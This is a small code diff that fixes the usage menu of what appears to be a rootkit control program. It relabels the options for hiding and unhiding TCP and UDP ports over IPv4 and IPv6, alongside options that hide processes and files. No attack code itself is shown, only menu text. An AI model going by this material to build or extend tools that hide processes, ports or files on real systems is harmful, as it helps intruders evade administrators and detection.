@@ -266,11 +266,11 @@ int main ( int argc, char *argv[] )
         printf("\t2 \tUnhide process with pid [ARG]\n");
         printf("\t3 \tHide TCP 4 port [ARG]\n");
         printf("\t4 \tUnhide TCP 4 port [ARG]\n");
-        printf("\t5 \tHide UDPv4 port [ARG]\n");
-        printf("\t6 \tUnhide UDPv4 port [ARG]\n");
-        printf("\t7 \tHide TCPv6 port [ARG]\n");
-        printf("\t8 \tUnhide TCPv6 port [ARG]\n");
-        printf("\t9 \tHide UDPv4 port [ARG]\n");
+        printf("\t5 \tHide TCPv6 port [ARG]\n");
+        printf("\t6 \tUnhide TCPv6 port [ARG]\n");
+        printf("\t7 \tHide UDPv4 port [ARG]\n");
+        printf("\t8 \tUnhide UDPv4 port [ARG]\n");
+        printf("\t9 \tHide UDPv6 port [ARG]\n");
         printf("\t10 \tUnhide UDPv6 port [ARG]\n");
         printf("\t11 \tHide file/directory named [ARG]\n");
         printf("\t12 \tUnhide file/directory named [ARG]\n");
